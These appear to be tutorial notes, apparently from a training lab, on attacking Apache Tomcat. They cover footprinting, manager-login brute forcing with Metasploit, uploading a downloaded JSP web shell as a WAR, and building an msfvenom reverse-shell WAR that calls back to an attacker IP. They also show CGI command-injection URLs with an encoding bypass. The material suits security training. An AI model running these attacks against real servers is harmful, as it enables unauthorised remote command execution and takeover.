

Apache Tomcat is an open-source web server that hosts applications written in Java. 

# Discovery/Footprinting

    

Tomcat servers can be identified by the Server header in the HTTP response. If the server is operating behind a reverse proxy, requesting an invalid page should reveal the server and version.

Custom error pages may be in use that do not leak this version information. In this case, 
another method of detecting a Tomcat server and version is through the /docs page.

`$ curl -s http://app-dev.inlanefreight.local:8080/docs/ | grep Tomcat `


Here is the general folder structure of a Tomcat installation.

```
├── bin
├── conf
│   ├── catalina.policy
│   ├── catalina.properties
│   ├── context.xml
│   ├── tomcat-users.xml
│   ├── tomcat-users.xsd
│   └── web.xml
├── lib
├── logs
├── temp
├── webapps
│   ├── manager
│   │   ├── images
│   │   ├── META-INF
│   │   └── WEB-INF
|   |       └── web.xml
│   └── ROOT
│       └── WEB-INF
└── work
└── Catalina
        └── localhost
```




- The bin folder stores scripts and binaries needed to start and run a Tomcat server. 

- The conf folder stores various configuration files used by Tomcat. (The **tomcat-users.xml** file stores user credentials and their assigned roles. )

- The lib folder holds the various JAR files needed for the correct functioning of Tomcat. 
- The logs and temp folders store temporary log files. 
- The webapps folder is the default webroot of Tomcat and hosts all the applications. 
- The work folder acts as a cache and is used to store data during runtime.

Each folder inside webapps is expected to have the following structure.

```
webapps/customapp
├── images
├── index.jsp
├── META-INF
│   └── context.xml
├── status.xsd
└── WEB-INF
├── jsp
|   └── admin.jsp
└── web.xml
└── lib
|    └── jdbc_drivers.jar
└── classes
     └── AdminServlet.class
```

        
The most important file among these is `WEB-INF/web.xml`, which is known as the deployment descriptor. This file stores information about the routes used by the application and the classes handling these routes. All compiled classes used by the application should be stored in the WEB-INF/classes folder.

Here’s an example `web.xml` file.

```
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE web-app PUBLIC "-//Sun Microsystems, Inc.//DTD Web Application 2.3//EN" "http://java.sun.com/dtd/web-app_2_3.dtd">
<web-app>
        <servlet>
                <servlet-name>AdminServlet</servlet-name>
                <servlet-class>com.inlanefreight.api.AdminServlet</servlet-class>
        </servlet>
        <servlet-mapping>
                <servlet-name>AdminServlet</servlet-name>
                <url-pattern>/admin</url-pattern>
        </servlet-mapping>
</web-app>   
```



# Enumeration

we'll typically want to look for the `/manager` and the `/host-manager` pages.
        
        
# Tomcat Manager - Login Brute Force

We can use the `auxiliary/scanner/http/tomcat_mgr_login` Metasploit module for these purposes, Burp Suite Intruder or any number of scripts to achieve this. We'll use Metasploit for our purposes.

```

msf6 auxiliary(scanner/http/tomcat_mgr_login) > set VHOST web01.inlanefreight.local

msf6 auxiliary(scanner/http/tomcat_mgr_login) > set RPORT 8180

msf6 auxiliary(scanner/http/tomcat_mgr_login) > set stop_on_success true

msf6 auxiliary(scanner/http/tomcat_mgr_login) > set rhosts 10.129.201.58
```

# Tomcat Manager - WAR File Upload


Many Tomcat installations provide a GUI interface to manage the application. This interface is available at `/manager/html` by default, which only users assigned the manager-gui role are allowed to access. Valid manager credentials can be used to upload a packaged Tomcat application (.WAR file) and compromise the application. A WAR, or Web Application Archive, is used to quickly deploy web applications and backup storage.




[java webshell](   https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp)

```
$ wget https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp

$ zip -r backup.war cmd.jsp 
```

- Click on Browse to select the .war file and then click on Deploy.

If we click on backup, we will get redirected to `http://web01.inlanefreight.local:8180/backup/ `and get a 404 Not Found error. We need to specify the cmd.jsp file in the URL as well. Browsing to `http://web01.inlanefreight.local:8180/backup/cmd.jsp` will present us with a web shell that we can use to run commands on the Tomcat server

### WAR reverse shell with msfvenom

```
$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.15 LPORT=4443 -f war > backup.war
```
Start a Netcat listener and click on /backup to execute the shell.




# CVE-2020-1938 : Ghostcat
        

AJP stands for Apache Jserv Protocol, which is a binary protocol used to proxy requests. This is typically used in proxying requests to application servers behind the front-end web servers.

The AJP service is usually running at port 8009 on a Tomcat server. This can be checked with a targeted Nmap scan.

`$ nmap -sV -p 8009,8080 app-dev.inlanefreight.local`

        



# Attacking Tomcat CGI


The CGI Servlet is a vital component of Apache Tomcat that enables web servers to communicate
with external applications beyond the Tomcat JVM. These external applications are 
typically CGI scripts written in languages like Perl, Python, or Bash. The CGI Servlet 
receives requests from web browsers and forwards them to CGI scripts for processing.


In essence, a CGI Servlet is a program that runs on a web server, such as Apache2, to  support the execution of external applications that conform to the CGI specification. 
It is a middleware between web servers and external information resources like databases.

The enableCmdLineArguments setting for Apache Tomcat's CGI Servlet controls whether command  line arguments are created from the query string. If set to true, the CGI Servlet parses the query string and passes it to the CGI script as arguments.




### Enumeration

```
$ nmap -p- -sC -Pn 10.129.204.227 --open 

8080/tcp  open  http-proxy
|_http-title: Apache Tomcat/9.0.17
|_http-favicon: Apache Tomcat
```


### Finding a CGI script

One way to uncover web server content is by utilising the ffuf web enumeration tool along with the 
dirb common.txt wordlist. Knowing that the default directory for CGI scripts is /cgi, either through 
prior knowledge or by researching the vulnerability, we can use the URL 


`http://10.129.204.227:8080/cgi/FUZZ.cmd or http://10.129.204.227:8080/cgi/FUZZ.bat`

to perform fuzzing.





## Exploitation


`http://10.129.204.227:8080/cgi/welcome.bat?&dir`



If the attempt was unsuccessful, and Tomcat responded with an error message indicating that an invalid 
character had been encountered, the filter can be bypassed by URL-encoding the 
payload.

`http://10.129.204.227:8080/cgi/welcome.bat?&c%3A%5Cwindows%5Csystem32%5Cwhoami.exe`








